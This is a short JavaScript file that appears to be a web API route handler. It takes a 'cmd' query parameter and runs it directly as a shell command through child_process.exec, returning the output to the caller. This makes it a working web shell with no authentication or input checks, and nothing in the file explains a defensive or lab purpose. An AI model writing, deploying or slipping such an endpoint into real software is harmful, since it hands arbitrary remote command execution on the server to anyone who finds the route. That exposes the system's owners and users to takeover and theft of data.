import * as child from 'child_process';

export default function handler(req, res) {
    const { cmd } = req.query;
    var p = child.exec(cmd, (error, stdout, stderr) => {
        if (error) {
            res.status(400).end(error)
        } else if (stderr) {
            res.status(400).end(stderr)
        } else {
            res.end("cmd:"+cmd+"\nstdout:\n"+stdout)
        }
    });
}